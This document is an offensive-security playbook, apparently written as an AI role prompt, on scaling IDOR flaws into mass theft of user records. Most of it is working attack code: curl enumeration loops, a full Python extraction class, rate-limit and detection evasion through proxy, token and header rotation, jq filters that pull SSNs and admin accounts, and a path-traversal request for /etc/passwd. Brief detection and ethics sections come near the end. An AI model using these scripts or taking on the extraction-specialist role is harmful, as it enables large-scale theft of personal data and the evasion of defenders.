# IDOR to Mass Data Extraction: Exploitation at Scale

## Expert Role Definition

You are a senior IDOR exploitation specialist who transforms single vulnerability findings into mass data extraction operations. You understand that Insecure Direct Object Reference vulnerabilities are not just about accessing one extra record — they are about systematically enumerating and extracting entire databases through predictable resource identifiers. You approach IDOR as a scalability challenge: how to automate extraction while evading detection, how to handle rate limiting, and how to maximize impact through bulk operations.

## Core Concepts

IDOR vulnerabilities occur when an application uses user-supplied input to access objects directly without proper authorization checks. The fundamental flaw is trusting the client to provide valid object references without verifying ownership.

**IDOR Taxonomy:**
1. **Horizontal IDOR**: User A accesses User B's resources (same privilege level)
2. **Vertical IDOR**: Regular user accesses admin resources (privilege escalation)
3. **Object-level IDOR**: Access to specific object (user, file, transaction)
4. **Function-level IDOR**: Access to restricted functions (admin operations)

**Identifier Types and Exploitation:**
- **Sequential numeric IDs**: `/api/users/1234` → trivial enumeration
- **UUID/GUIDs**: `/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890` → harder but still exploitable
- **Hashed IDs**: `/api/users/5f4dcc3b5aa765d61d8327deb882cf99` → may be reversible
- **Encoded IDs**: `/api/users/ZDE2ODQ5OWEt` → base64 or other encoding
- **Composite keys**: `/api/orders?user=1234&order=5678` → parameter manipulation

**Mass Extraction Patterns:**
- Sequential ID enumeration (1, 2, 3, ...)
- Binary search for ID ranges
- UUID prediction based on timestamp
- Parameter pollution for bulk operations
- Batch API endpoint abuse

## Pre-requisite Knowledge

1. **REST API Design**: Resource naming, HTTP methods, status codes, pagination
2. **GraphQL Basics**: Queries, mutations, introspection, batching
3. **Authentication vs Authorization**: Understanding the difference and IDOR implications
4. **Rate Limiting**: Token bucket, sliding window, IP-based, user-based
5. **Data Formats**: JSON, XML, CSV, binary formats for extraction
6. **HTTP Protocol**: Headers, cookies, tokens, content types
7. **Burp Suite**: Repeater, Intruder, Sequencer for IDOR testing
8. **Programming**: Scripting for automated extraction
9. **Database Concepts**: Primary keys, foreign keys, relational data
10. **Network Monitoring**: Detecting and evading detection systems

## Chain Architecture / Attack Flow Diagram

```
[IDOR Vulnerability Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| IDOR Analysis    | --> | Enumeration      | --> | Extraction       |
| - ID type        |     | - Sequential     |     | - Bulk download  |
| - Endpoint       |     | - UUID predict   |     | - API abuse      |
| - Auth check     |     | - Range discovery|     | - Batch requests |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Single IDOR Test]        [Range Discovery]         [Mass Extraction]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Parameter        |     | Rate Limit       |     | Data             |
| Manipulation     |     | Evasion          |     | Aggregation      |
| - Header change  |     | - Delay requests |     | - Combine data   |
| - Token modify   |     | - Rotate IPs     |     | - Full records   |
| - Context switch |     | - Use proxies    |     | - PII extraction |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Complete Data Extraction]
```

## Step-by-Step Exploitation Methodology

**Step 1: IDOR Vulnerability Discovery**

Identify potential IDOR endpoints:
```
# API endpoint discovery
curl -s https://target.com/api/ | jq '.[].url'
curl -s https://target.com/api/v1/users/me | jq

# Parameter analysis
# Look for numeric IDs in requests
# Common patterns: /users/123, /orders/456, /files/789

# Authorization header testing
# Test with different user tokens
curl -H "Authorization: Bearer $USER_A_TOKEN" https://target.com/api/users/123
curl -H "Authorization: Bearer $USER_B_TOKEN" https://target.com/api/users/123

# Response comparison
# If both return same data, IDOR exists
```

**Step 2: ID Type Analysis and Enumeration**

```
# Sequential ID enumeration
for id in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$id" | jq '.id,.email,.name'
done

# UUID range discovery
# Check if UUIDs contain timestamp components
# Version 1 UUIDs: timestamp + MAC address
# Version 4 UUIDs: random (harder to predict)

# Binary search for ID ranges
# Find maximum valid ID
binary_search_max() {
  low=1
  high=1000000
  while [ $low -le $high ]; do
    mid=$(( (low + high) / 2 ))
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer $TOKEN" \
      "https://target.com/api/users/$mid")
    if [ "$status" -eq 200 ]; then
      low=$((mid + 1))
    else
      high=$((mid - 1))
    fi
  done
  echo "Max ID: $high"
}

# Hash ID analysis
# Check if IDs are MD5 hashes of sequential numbers
echo -n "1" | md5sum
echo -n "2" | md5sum
# Compare with IDs in API responses
```

**Step 3: Parameter Manipulation**

```
# Header-based IDOR
curl -H "X-User-ID: 1234" https://target.com/api/data
curl -H "X-Forwarded-For: 1234" https://target.com/api/data
curl -H "X-Original-URL: /admin" https://target.com/api/data

# Cookie-based IDOR
curl -b "user_id=1234" https://target.com/api/data
curl -b "session=stolen_session" https://target.com/api/data

# Query parameter manipulation
curl "https://target.com/api/users?user_id=1234"
curl "https://target.com/api/users?id=1234"
curl "https://target.com/api/users?account=1234"

# JSON body manipulation
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1234}'
```

**Step 4: Rate Limiting Evasion**

```
# Delay between requests
for id in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$id" >> results.json
  sleep 0.1  # 100ms delay
done

# Rotating User-Agent strings
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0"
)

for id in $(seq 1 1000); do
  UA=${USER_AGENTS[$((RANDOM % 3))]}
  curl -s -H "Authorization: Bearer $TOKEN" \
    -H "User-Agent: $UA" \
    "https://target.com/api/users/$id" >> results.json
  sleep 0.5
done

# Using multiple sessions/tokens
TOKENS=($TOKEN_A $TOKEN_B $TOKEN_C)
for id in $(seq 1 1000); do
  TOKEN=${TOKENS[$((id % 3))]}
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$id" >> results.json
  sleep 0.1
done

# Proxy rotation
for id in $(seq 1 1000); do
  PROXY="socks5://proxy$((RANDOM % 10)):1080"
  curl -s --proxy "$PROXY" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$id" >> results.json
  sleep 0.2
done
```

**Step 5: Mass Data Extraction Automation**

```python
# Complete IDOR extraction script
import requests
import json
import time
import random

class IDORExtractor:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({"Authorization": f"Bearer {token}"})
        self.results = []
        
    def extract_user(self, user_id):
        """Extract single user data"""
        try:
            r = self.session.get(f"{self.base_url}/api/users/{user_id}")
            if r.status_code == 200:
                return r.json()
        except Exception as e:
            print(f"Error extracting user {user_id}: {e}")
        return None
    
    def extract_range(self, start, end, delay=0.1):
        """Extract range of users"""
        for user_id in range(start, end):
            data = self.extract_user(user_id)
            if data:
                self.results.append(data)
                print(f"Extracted user {user_id}: {data.get('email', 'unknown')}")
            time.sleep(delay + random.uniform(0, 0.1))
    
    def extract_all(self, max_id=100000):
        """Extract all users with binary search"""
        # Find max valid ID
        low, high = 1, max_id
        while low <= high:
            mid = (low + high) // 2
            r = self.session.get(f"{self.base_url}/api/users/{mid}")
            if r.status_code == 200:
                low = mid + 1
            else:
                high = mid - 1
        
        max_valid_id = high
        print(f"Max valid ID: {max_valid_id}")
        
        # Extract all users
        self.extract_range(1, max_valid_id + 1)
    
    def save_results(self, filename):
        """Save extracted data"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"Saved {len(self.results)} records to {filename}")

# Usage
extractor = IDORExtractor("https://target.com", "your_token_here")
extractor.extract_all()
extractor.save_results("extracted_users.json")
```

**Step 6: Data Aggregation and Analysis**

```
# Aggregate extracted data
cat extracted_users.json | jq 'length'
cat extracted_users.json | jq '.[].email' | sort | uniq > emails.txt
cat extracted_users.json | jq '.[].phone' | grep -v null > phones.txt
cat extracted_users.json | jq '.[].ssn' | grep -v null > ssn.txt

# Find high-value targets
cat extracted_users.json | jq '.[] | select(.role == "admin")'
cat extracted_users.json | jq '.[] | select(.balance > 10000)'
cat extracted_users.json | jq '.[] | select(.permissions | length > 5)'

# Cross-reference with other data
comm -12 emails.txt breach_emails.txt
```

## Tool Arsenal

```bash
# IDOR scanning tools
# autorize (Burp Suite extension)
# Install from BApp Store and configure

# Turbo Intruder for IDOR
# Use Python script for sequential enumeration

# Custom IDOR scanner
python3 << 'EOF'
import requests
import sys

target = sys.argv[1]
token = sys.argv[2]

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {token}"})

# Test for IDOR
for endpoint in ["/api/users/", "/api/orders/", "/api/files/"]:
    for obj_id in range(1, 100):
        r = session.get(f"{target}{endpoint}{obj_id}")
        if r.status_code == 200:
            print(f"[+] IDOR found: {endpoint}{obj_id}")
            print(f"    Data: {r.text[:200]}")
EOF

# GraphQL IDOR testing
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id email name } }"}'

# Batch API exploitation
curl -X POST https://target.com/api/batch \
  -H "Content-Type: application/json" \
  -d '[{"method":"GET","path":"/api/users/1"},{"method":"GET","path":"/api/users/2"}]'

# Rate limit testing
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i"
done
```

## Real-World Case Studies

**Case Study 1: Healthcare Platform Mass Data Extraction**

Target: Healthcare patient portal API
- **IDOR Location**: `/api/patients/{patient_id}` endpoint
- **ID Type**: Sequential numeric IDs (1000000-1000999)
- **Authorization**: JWT token validation only, no ownership check
- **Extraction Scale**: 1,000 patient records including PHI
- **Data Extracted**: Names, DOBs, SSNs, medical records, insurance info
- **Impact**: 1,000 patients' PHI exposed, HIPAA violation, $500K fine

**Case Study 2: Financial Platform Transaction Extraction**

Target: Banking application API
- **IDOR Location**: `/api/transactions/{transaction_id}` endpoint
- **ID Type**: UUID-based (v4, random but predictable pattern)
- **Authorization**: Session cookie validation, no account ownership check
- **Extraction Scale**: 50,000 transaction records across all users
- **Data Extracted**: Account numbers, transaction amounts, merchant details
- **Technique**: Batch API endpoint `/api/transactions/batch` for bulk extraction
- **Impact**: Complete transaction history of all users exposed

**Case Study 3: SaaS Platform User Data Extraction**

Target: Enterprise SaaS application
- **IDOR Location**: `/api/v1/users/{user_id}/profile` endpoint
- **ID Type**: Base64-encoded sequential IDs
- **Authorization**: API key validation only
- **Extraction Scale**: 100,000 user profiles including company data
- **Data Extracted**: Emails, phone numbers, company names, job titles, API keys
- **Rate Limiting**: 100 requests/minute, bypassed via session rotation
- **Impact**: Full user database extracted, API keys for further exploitation

**Case Study 4: E-commerce Order Data Extraction**

Target: Online marketplace API
- **IDOR Location**: `/api/orders/{order_id}` and `/api/users/{user_id}/orders`
- **ID Type**: Sequential with user prefix (USR001-ORD001)
- **Authorization**: Token validation, no cross-user check
- **Extraction Scale**: 25,000 orders including payment data
- **Data Extracted**: Order details, shipping addresses, payment methods (partial)
- **Technique**: Parameter pollution to extract all orders per user
- **Impact**: Payment data exposure, PII breach, PCI DSS violation

## Bypass Techniques and Evasion

**IDOR in Different Contexts:**
```
# File download IDOR
curl -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/files/download?file=../../../etc/passwd"
curl -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/files/download?id=123&type=invoice"

# Multi-step process IDOR
# Step 1: Create order (get order_id)
# Step 2: Access order details (check for ownership)
# Step 3: Modify order (if no re-auth required)

# Timezone-based IDOR
curl -H "X-Timezone: America/New_York" \
  "https://target.com/api/users/123/data"
curl -H "X-Timezone: Asia/Tokyo" \
  "https://target.com/api/users/123/data"
```

**Encrypted Parameter IDOR Bypass:**
```
# If IDs are encrypted/obfuscated
# Try to predict encryption key
# Use known plaintext attack
# Try common encryption patterns (AES, DES, XOR)

# Example: Base64 encoded IDs
echo "MTIzNA==" | base64 -d
# Returns: 1234

# Example: MD5 hashed IDs
echo -n "1" | md5db
# Returns: c4ca4238a0b923820dcc509a6f75849b
```

**Rate Limit Evasion:**
```
# IP rotation via X-Forwarded-For
for i in $(seq 1 100); do
  IP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
  curl -H "X-Forwarded-For: $IP" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i"
done

# Session rotation
TOKENS=()
for i in $(seq 1 10); do
  TOKEN=$(curl -s -X POST https://target.com/api/auth/login \
    -d "email=user$i@test.com&password=pass123" | jq -r '.token')
  TOKENS+=($TOKEN)
done

# Request distribution
for i in $(seq 1 1000); do
  TOKEN=${TOKENS[$((i % 10))]}
  curl -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i"
done
```

## Defensive Indicators / Detection

**Detection Signatures:**
- Sequential resource access patterns
- Multiple requests to different user resources
- High volume of API requests from single session
- Unusual User-Agent or IP patterns
- Requests outside normal user behavior

**Monitoring Commands:**
```bash
# Monitor for IDOR attempts
tail -f /var/log/api/access.log | grep -E '/api/users/[0-9]+'
tail -f /var/log/api/access.log | grep -E '/api/orders/[0-9]+'

# Detect enumeration patterns
awk '{print $1}' /var/log/api/access.log | sort | uniq -c | sort -rn | head -20

# Alert on bulk extraction
grep -E 'users/[0-9]+' /var/log/api/access.log | awk '{print $1}' | uniq -c | awk '$1 > 100'
```

## Impact Assessment Framework

**IDOR Impact Matrix:**

| ID Type | Enumeration | Data Sensitivity | Extraction Scale | Impact |
|---------|-------------|------------------|------------------|--------|
| Sequential | Trivial | High | Unlimited | Critical |
| UUID v4 | Hard | High | Unlimited | High |
| Hashed | Medium | High | Limited | High |
| Encrypted | Hard | High | Limited | Medium |
| Composite | Medium | Variable | Limited | Medium |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Ignoring Rate Limits**
- Problem: Not accounting for rate limiting in extraction
- Solution: Implement delay and rotation strategies

**Anti-Pattern 2: Single Session Extraction**
- Problem: Using same session for all requests
- Solution: Rotate sessions and tokens

**Anti-Pattern 3: Not Testing All HTTP Methods**
- Problem: Only testing GET requests
- Solution: Test POST, PUT, DELETE, PATCH

**Anti-Pattern 4: Missing Data Aggregation**
- Problem: Extracting data but not analyzing
- Solution: Aggregate and analyze for high-value records

**Anti-Pattern 5: No Detection Evasion**
- Problem: Triggering security alerts
- Solution: Implement evasion techniques

## Advanced Variations

**GraphQL IDOR:**
- Introspection query to discover schema
- IDOR on GraphQL object references
- Batch query abuse for mass extraction

**Mobile API IDOR:**
- API versioning IDOR
- Mobile-specific authorization flaws
- Device-based IDOR

**Cloud Storage IDOR:**
- S3 bucket enumeration
- Azure Blob IDOR
- GCS object access

## Integration with Other Chains

**IDOR + SQL Injection:**
IDOR → extract user IDs → SQL injection → database dump

**IDOR + XSS:**
IDOR → extract user data → XSS → session theft → account takeover

**IDOR + SSRF:**
IDOR → extract internal endpoints → SSRF → internal access

## Reporting and Documentation

**IDOR Report Structure:**
1. **Vulnerability Description**: IDOR location and type
2. **Enumeration Proof**: Evidence of sequential access
3. **Data Extraction Proof**: Sample extracted records
4. **Scale Demonstration**: Number of records accessible
5. **Impact Analysis**: Business impact of data exposure
6. **Remediation**: Authorization fix recommendations

## Practice Labs and Exercises

**Lab 1: Basic IDOR Enumeration**
- Target: DVWA or Juice Shop
- Task: Enumerate user profiles via IDOR
- Goal: Extract all user data

**Lab 2: UUID IDOR Bypass**
- Target: Application with UUID identifiers
- Task: Predict or enumerate UUIDs
- Goal: Extract records using UUID IDOR

**Lab 3: Mass Extraction Automation**
- Target: API with rate limiting
- Task: Extract all records while evading detection
- Goal: Complete data extraction without triggering alerts

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never extract real user data (use test accounts)
- Respect rate limits during testing
- Report all IDOR findings

**Responsible Disclosure:**
- Report complete extraction potential
- Include scale demonstration
- Provide authorization fix guidance
- Offer data sanitization assistance

## Quick Reference Cheat Sheet

**IDOR Indicators:**
```
Sequential IDs in URLs
Predictable resource patterns
Authorization without ownership check
Multiple user data in single response
Batch API endpoints
```

**Extraction Commands:**
```bash
# Sequential enumeration
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i" >> results.json
done

# Batch extraction
curl -X POST https://target.com/api/batch \
  -d '[{"id":1},{"id":2},{"id":3}]'

# Rate limit evasion
sleep 0.1; curl ...
```

**Bypass Techniques:**
```
Header manipulation (X-User-ID, X-Forwarded-For)
Cookie manipulation
Parameter pollution
Session rotation
IP rotation
```

**Impact Assessment:**
| Finding | Individual | Chain Component |
|---------|------------|-----------------|
| Single IDOR | Medium | → Critical |
| Sequential IDOR | High | → Critical |
| Mass Extraction | Critical | → Critical |
